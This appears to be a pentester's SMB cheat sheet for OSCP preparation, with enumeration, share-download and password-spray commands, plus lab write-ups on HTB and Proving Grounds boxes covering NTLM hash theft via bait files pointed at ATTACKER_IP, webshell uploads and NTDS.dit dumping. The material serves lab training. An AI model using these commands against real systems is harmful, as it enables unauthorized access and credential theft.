# SMB - Ports 139 / 445

## Enumerate Shares

```bash
# Null session
smbclient -L //$IP -N

# With creds
smbclient -L //$IP -U 'user%password'

# smbmap — shows permissions
smbmap -H $IP
smbmap -H $IP -u user -p password
smbmap -H $IP -u null

# NetExec
nxc smb $IP -u '' -p '' --shares
nxc smb $IP -u 'guest' -p '' --shares
nxc smb $IP -u user -p password --shares
```

## Connect to Share

```bash
smbclient //$IP/share -N
smbclient //$IP/share -U 'user%password'

# Inside smbclient
smb> dir
smb> cd directory
smb> get file.txt
smb> put local.txt
smb> prompt off; mget *
```

## Enumerate Users

```bash
# enum4linux
enum4linux -a $IP

# RID brute force (finds users even without creds)
nxc smb $IP -u '' -p '' --rid-brute
nxc smb $IP -u 'guest' -p '' --rid-brute

# impacket
impacket-lookupsid anonymous@$IP
```

## Nmap Scripts

```bash
nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery -p 445 $IP
nmap --script smb-vuln* -p 445 $IP
```

## EternalBlue (MS17-010)

```bash
nmap --script smb-vuln-ms17-010 -p 445 $IP
```

## Download Everything from a Share

```bash
smbget -R smb://$IP/share

# Or with smbclient
smbclient //$IP/share -N -c 'recurse ON; prompt OFF; mget *'

# Or mount it
sudo mount -t cifs //$IP/share /mnt -o user=,password=
sudo mount -t cifs //$IP/share /mnt -o user=admin,password=pass
```

## Password Spray

```bash
nxc smb $IP -u users.txt -p REDACTED --continue-on-success
nxc smb $IP -u users.txt -p 'REDACTED' --continue-on-success
```

## Tips

- **50% of OSCP boxes have passwords in user descriptions** — always enumerate users and their description fields.
- Null sessions (`-N`) and guest access are common misconfigs.
- Look for: config files, passwords, backup files, scripts, database files.
- SMB shares may overlap with web root — upload a web shell via SMB.
- Check `IPC$` share for null session access even if other shares are locked.

## From Your Boxes

> **Active** (HTB) — Null session listed shares. `Replication` share readable anonymously. Used `nxc smb -M spider_plus` to find `Groups.xml` containing GPP-encrypted password for `SVC_TGS`. Decrypted with `gpp-decrypt` to get `GPPstillStandingStrong2k18`. Kerberoasted admin from there.
> - What worked: `smbclient -N -L \\TARGET_IP` then `nxc smb TARGET_IP -u '' -p '' -M spider_plus`
> - Lesson: Always spider SMB shares — GPP passwords in SYSVOL/Replication are a classic instant win.

> **Shenzi** (PG/Windows) — Null session accessed custom `Shenzi` share containing `passwords.txt`, session files, and config files. Direct credential harvest from readable share.
> - What worked: `smbclient -U '' \\\\TARGET_IP\\Shenzi` then `RECURSE ON; MGET *`
> - Lesson: Always download everything from accessible shares. Password files, configs, and session data are common.

> **Flight** (HTB) — After password spraying found `s.moon` had write access to `Shared` SMB share. Uploaded ntlm_theft-generated files (desktop.ini, etc.) to steal NTLMv2 hash for `c.bum` via Responder. c.bum had write to `Web` share, uploaded PHP webshell to get RCE.
> - What worked: `python3 ntlm_theft.py -g all -s TARGET_IP -f evil` then `smbclient //flight.htb/shared -U s.moon` to upload
> - Lesson: Writable SMB shares = NTLM theft opportunity. Upload .lnk/.scf/.ini files and run Responder.

> **Vault** (PG/Windows) — RID brute forcing found user `anirudh`. Uploaded ntlm_theft `.lnk` file to writable `DocumentsShare`. Responder caught NTLMv2 hash, cracked to `SecureHM`. WinRM access gained.
> - What worked: `python3 ntlm_theft.py -g lnk -s ATTACKER_IP -f vault` then uploaded to SMB share
> - Lesson: Empty writable shares are bait — someone is browsing them. Upload NTLM theft payloads and wait.

> **Monteverde** (HTB) — Password spray with `users.txt` as both username and password found `SABatchJobs:REDACTED`. SMB `users$` share contained `azure.xml` with password for `mhope`. Evil-WinRM for shell.
> - What worked: `nxc smb TARGET_IP -u users.txt -p REDACTED --continue-on-success`
> - Lesson: Username=password is shockingly common in AD. Always try it. Then enumerate every accessible SMB share for files.

> **Resourced** (PG/Windows) — SMB share contained NTDS.dit and SYSTEM hive in a "password audit" share. Extracted all domain hashes locally with secretsdump. Sprayed hashes for valid login.
> - What worked: `impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:REDACTED LOCAL`
> - Lesson: NTDS.dit + SYSTEM hive on a share = full domain compromise. Always check for backup/audit shares.
